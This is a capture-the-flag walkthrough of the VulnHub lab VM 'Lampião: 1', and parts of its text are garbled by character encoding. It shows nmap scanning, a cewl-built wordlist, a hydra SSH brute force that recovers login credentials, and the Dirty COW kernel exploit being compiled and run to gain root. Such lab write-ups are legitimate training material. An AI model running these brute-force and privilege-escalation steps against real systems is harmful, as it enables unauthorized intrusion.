This post documents the complete walkthrough of LampiÃ£o: 1, a boot2root VM created by Tiago Tavares, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.

Background
âCaptainâ Virgulino Ferreira da Silva, better known as LampiÃ£o, was the most famous bandit leader of the CangaÃ§o. The aim is to get root.
Information Gathering
Letâs start with a nmap scan to establish the available services in the host.
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130

nmap finds 22/tcp, 80/tcp and 1898/tcp openâand thereâs something interesting behind 80/tcp.

âFi duma Ã©guaâ is a not-so-elegant word for referring to someone. I leave it for the curious reader to find out what it means. 
Drupal
Another service worth exploring is Drupal, which runs behind 1898/tcp. Hereâs how it looks like.

To be honest, Iâm always excited to see non-English language in display because that means I can generate a wordlist from it. Thereâs always a high chance of getting a password judging from my experience.
Letâs use cewl to generate a wordlist from the post âLampiÃ£o, herÃ³i ou vilÃ£o do SertÃ£o?â. The command goes like this.
# cewl -w cewl.txt http://192.168.10.130:1898/?q=node/1
# wc -l cewl.txt
835 cewl.txt

Hail Hydra
Notice the two usernames below: tiago and eder.

Letâs put them into a username list and go with hydra and the generated wordlist. Perhaps we can get lucky with SSH on our first attempt?
# echo tiago &gt; usernames.txt
# echo eder &gt;&gt; usernames.txt
# hydra -L usernames.txt -P cewl.txt -f -e nsr -o hydra.txt -t 4 ssh://192.168.10.130
[22][ssh] host: 192.168.10.130   login: tiago   password: Virgulino
[STATUS] attack finished for 192.168.10.130 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

Lucky indeed.
Low-Privilege Shell
Not too shabby.

Privilege Escalation
Letâs perform some basic enumeration to determine what weâre dealing with.
$ uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
$ lsb_release -a

Iâm going to use a script to suggest a couple of local privilege escalation exploits relevant to the distribution and kernel.

$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
$ ./dcow -s


Boom.
Whatâs the Flag (WTF)?


I wonder whatâs the significance of lampiao.jpg to the flag. Hereâs what lampiao.jpg looks like.

Afterthought
The VM isnât hard. Donât think too deep, too far. Donât go down the rabbit hole. Tiago (the creator of this VM) laid down a bunch of teasers that may steer you off course.
One good example is qrc.png in the Drupal home directory.

It was decoded to âTry harder! muahuahuaâ 
Another example was the removal of read permissions of /etc/cangaco/lampiao.*. Thatâs a good one. It piqued my curiosity so much I almost pulled out all my hair trying to read them.
